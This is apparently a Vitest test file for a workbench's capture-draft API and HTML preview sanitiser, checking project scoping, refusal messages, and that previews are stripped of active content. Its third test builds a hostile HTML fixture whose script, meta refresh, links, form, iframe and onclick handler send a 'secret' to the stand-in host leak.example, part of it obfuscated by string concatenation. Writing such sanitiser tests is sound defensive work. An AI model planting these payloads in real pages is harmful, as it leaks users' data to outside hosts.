// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from 'vitest';
import { captureDraftApi, captureDraftPreviewDocument } from '../../src/providers/workbench-capture-drafts';

afterEach(() => vi.unstubAllGlobals());

describe('capture draft boundary', () => {
  it('rejects a well-formed draft from another project', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify({ drafts: [{
      schema: 'capture-draft/1', draftId: 'draft_AAAAAAAAAAAAAAAAAAAA', projectId: 'other', captureId: 'cap_AAAAAAAAAAAAAAAAAAAA',
      revision: 1, parentRevision: null, createdAt: '2026-10-09T11:00:00.000Z', status: 'ready', prompt: 'Build pricing',
      html: '<p>Pricing</p>', outputSha256: 'b'.repeat(64), assumptions: [], failure: null,
      generator: { provider: 'claude-max', modelId: 'claude-opus-5-5', billingLane: 'max-subscription' },
    }] }), { status: 200 })));
    await expect(captureDraftApi.list('p1')).rejects.toMatchObject({ reason: 'scope-mismatch' });
  });

  it('keeps typed provider refusals and their recovery text', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify({ error: { message: 'Sign-in required', details: { reason: 'provider-auth-required', recovery: 'Sign in to Claude Max.' } } }), { status: 422 })));
    await expect(captureDraftApi.list('p1')).rejects.toMatchObject({ status: 422, reason: 'provider-auth-required', recovery: 'Sign in to Claude Max.' });
  });

  it('renders a static document without scripts, self-navigation, external links, refresh or nested frames', () => {
    const raw = `<html><head><style>section{color:red}</style><meta http-equiv="refresh" content="0;url=https://leak.example"></head><body>
      <script>location='/'+'/'+'leak.example'+'?secret=x';</script>
      <a href="https://leak.example" ping="https://leak.example">View</a><form action="https://leak.example"><button formaction="https://leak.example">Send</button></form>
      <svg><a xlink:href="https://leak.example">Icon</a></svg><iframe src="https://leak.example"></iframe>
      <section id="pricing" onclick="location='//leak.example'"><img src="data:image/png;base64,YQ==">Pricing</section>
    </body></html>`;
    const doc = new DOMParser().parseFromString(captureDraftPreviewDocument(raw), 'text/html');
    expect(doc.querySelectorAll('script,iframe,form,base,object,embed,[href],[xlink\\:href],[ping],[onclick],[formaction]')).toHaveLength(0);
    expect(doc.querySelector('meta[http-equiv="refresh"]')).toBeNull();
    expect(doc.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content')).toContain("script-src 'none'");
    expect(doc.querySelector('section')?.textContent).toBe('Pricing');
    expect(doc.querySelector('style')?.textContent).toBe('section{color:red}');
    expect(raw).toContain("location='/'+'/'"); // Stored source is not rewritten.
  });
});
